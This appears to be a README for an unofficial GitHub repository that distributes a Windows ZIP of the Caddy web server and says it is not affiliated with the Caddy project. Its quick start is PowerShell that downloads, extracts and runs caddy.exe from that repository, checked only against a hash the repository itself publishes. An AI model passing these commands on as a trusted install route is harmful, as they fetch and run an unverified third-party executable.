<div align="center">

# Caddy — Windows Original ZIP

**A clean Windows package reference for the web server, reverse proxy, and automatic HTTPS.**

![Platform](https://img.shields.io/badge/platform-Windows-2563EB?logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/version-2.11.7-0EA5E9)
![Package](https://img.shields.io/badge/package-Original%20ZIP-16A34A)

[![Download](https://img.shields.io/badge/DOWNLOAD-ORIGINAL%20ZIP-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip)

</div>

> Independent community-maintained reference. The Release asset contains the original Windows package without modification. This repository is not affiliated with or endorsed by the Caddy project.

## Download

<p align="center"><a href="https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip"><img src="https://img.shields.io/badge/Download%20Caddy%202.11.7%20for%20Windows-16A34A?style=for-the-badge" alt="Download Caddy original ZIP"></a></p>

- [Latest GitHub Release](https://github.com/CaddySoftware/caddy-download/releases/latest)
- [CaddySoftware profile](https://github.com/CaddySoftware)
- [Caddy landing page](https://CaddySoftware.github.io/)

## What is Caddy?

Caddy is a modern web server that can serve sites, act as a reverse proxy, and automate HTTPS certificate management for configured domains.

## Package contents

- `caddy.exe` — Windows amd64 executable
- `LICENSE` — license file included in the original package
- `README.md` — package notes

## Integrity verification

**SHA-256:** `0A1EDC0B799512051C57071CE0E798D3F2CF67DC98171366F1D2B326072E3B06`

**Archive size:** `18,479,498 bytes`

```powershell
Get-FileHash .\caddy-2.11.7-windows-amd64-original.zip -Algorithm SHA256
```

The calculated value must match the SHA-256 value above. The checksum is also recorded in [`SHA256SUMS.txt`](./SHA256SUMS.txt).

## Quick start

```powershell
$zip = ".\caddy-2.11.7-windows-amd64-original.zip"
Invoke-WebRequest "https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip" -OutFile $zip
Get-FileHash $zip -Algorithm SHA256
Expand-Archive $zip .\caddy
cd .\caddy
.\caddy.exe version
```

The command above downloads the ZIP directly from the CaddySoftware GitHub Release, verifies its checksum, and extracts it locally.

```powershell
.\caddy.exe run --config .\Caddyfile
```

Example `Caddyfile`:

```text
example.com {
    reverse_proxy 127.0.0.1:8080
}
```

Use Caddy only with domains and systems you own or are authorized to administer. Product names and trademarks belong to their respective owners.
